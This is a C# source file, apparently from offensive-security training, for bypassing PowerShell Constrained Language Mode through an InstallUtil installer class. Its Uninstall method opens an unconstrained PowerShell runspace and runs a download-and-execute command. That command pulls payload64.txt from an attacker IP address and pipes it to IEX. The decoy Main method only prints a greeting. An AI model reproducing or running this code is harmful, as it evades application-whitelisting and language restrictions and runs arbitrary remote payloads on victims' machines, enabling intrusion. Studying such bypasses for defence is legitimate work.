using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass_CLM_Constrain_Language_Mode
{
    public class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Hello there!");
        }
    }

    [System.ComponentModel.RunInstaller(true)]

    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            //Use the normal attack chain XOR and final payload - EncryptingFinalPayloadXOR / EncryptingFinalPayloadAfterXOR / x64 or x86
            //String cmd = "(New-Object Net.WebClient).DownloadString('http://192.168.45.187/payload64.txt') | iex";
            String cmd =  "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.187/payload64.txt') | IEX";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}